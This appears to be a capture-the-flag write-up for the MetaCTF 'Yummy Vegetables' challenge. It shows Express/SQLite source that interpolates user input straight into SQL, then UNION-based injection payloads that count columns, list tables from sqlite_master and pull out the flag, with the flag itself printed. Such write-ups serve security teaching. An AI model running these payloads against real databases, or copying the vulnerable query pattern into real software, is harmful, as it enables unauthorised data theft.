# Yummy Vegetables

This Challenges was based on a simple SQL injection.

First we looked at the interaction of the web page and see directly that there
is a query made over a custom  
http Query. We can simulate such a query with this curl script:  
```bash  
curl http://host.cg21.metaproblems.com:4010/search -X SEARCH --header
"Content-Type: application/json" --data '{"query":"test"}'  
```

With the given sourcecode of the index.js:  
```js  
const express = require('express');  
const Ajv = require('ajv');  
const sqlite = require('better-sqlite3');  
const sleep = (ms) => new Promise((res) => { setTimeout(res, ms) })  
// set up express  
const app = express();  
app.use(express.json());  
app.use(express.static('public'));  
// ajv request validator  
const ajv = new Ajv();  
const schema = {  
 type: 'object',  
 properties: {  
   query: { type: 'string' },  
 },  
 required: ['query'],  
 additionalProperties: false  
};  
const validate = ajv.compile(schema);  
// database  
const db = sqlite('db.sqlite3');  
// search route  
app.search('/search', async (req, res) => {  
 if (!validate(req.body)) {  
   return res.json({  
     success: false,  
     msg: 'Invalid search query',  
     results: [],  
   });  
 }  
 await sleep(5000); // the database is slow :p  
 const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;  
 let results;  
 try {  
   results = db.prepare(query).all();  
 } catch {  
   return res.json({  
     success: false,  
     msg: 'Something went wrong :(',  
     results: [],  
   })  
 }  
 return res.json({  
   success: true,  
   msg: `${results.length} result(s)`,  
   results,  
 });  
});  
// start server  
app.listen(3000, () => {  
 console.log('Server started');  
});  
```

We can also verify the SQLi vector at the line:  
```js  
const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;  
```

With this given SQL injection we can now check the column count:  
```sql  
%' order by 5; --  
%' order by 4; --  
%' order by 3; --  
```  
So we know that we got 3 columns so lets create a test:

```  
%' AND 1=0 UNION SELECT 1,name,3 FROM sqlite_master; --  
```

And we get a list of tables in the database. We can assume that our table
`the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5`  
holds our flag, so we tried to get the column flag of that table.

```sql  
%' and 1=0 UNION SELECT 1,flag,2 FROM
the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5; --  
```

And we got the flag:

```  
MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}  
```

Original writeup (https://github.com/PwnProphecy/ctf/blob/main/metactf-
cybergames2021/Yummy-Vegetables.md).